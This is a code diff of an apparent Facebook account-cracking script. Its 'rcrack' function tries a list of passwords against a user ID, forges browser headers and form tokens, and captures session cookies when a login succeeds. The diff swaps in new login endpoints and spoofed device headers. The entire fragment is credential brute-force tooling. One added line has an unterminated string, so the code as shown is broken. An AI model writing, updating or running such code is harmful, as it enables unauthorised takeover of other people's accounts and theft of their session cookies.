@@ -404,7 +404,7 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://free.facebook.com').text
+            free_fb = session.get('http://x.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecates&lwv=100').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -416,26 +416,30 @@ def rcrack(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             headers = {
-    'authority': 'www.alpha.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'authority': 'x.alpha.facebook.com',
+    'accept': '*/*',
     'accept-language': 'fa-AF,fa;q=0.9,en-US;q=0.8,en;q=0.7',
-    'cache-control': 'max-age=0',
     'content-type': 'application/x-www-form-urlencoded',
-    # 'cookie': 'datr=mS3uZA7nU3TLSI8pRoXE79kW; sb=mS3uZJs4T4dSrpwtR2bk_zgE; fr=0C8xQ1T6dBJlE9i85..Bk7i2Z.Y2.AAA.0.0.Bk7rH-.AWWAV2RJagw; wd=980x920; dpr=4',
-    'origin': 'https://www.alpha.facebook.com',
-    'referer': 'https://www.alpha.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348131',
-    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
+    'dpr': '4',
+    'origin': 'https://x.alpha.facebook.com',
+    'referer': 'https://x.alpha.facebook.com/',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="115", "Google Chrome";v="115"',
+    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="115.0.5842.215", "Google Chrome";v="115.0.5842.215"',
     'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"macOS"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
+    'sec-ch-ua-model': '"SH-04L"',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-ch-ua-platform-version': '""',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5785.211 Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5842.215 Safari/537.36',
+    'viewport-width': '360',
+    'x-asbd-id': '129477',
+    'x-fb-lsd': 'AVoWTTbBnwc',
 }
 
-            lo = session.post('https://x.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
+            lo = session.post('https://x.alpha.facebook.com/login/device-based/login/async/).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
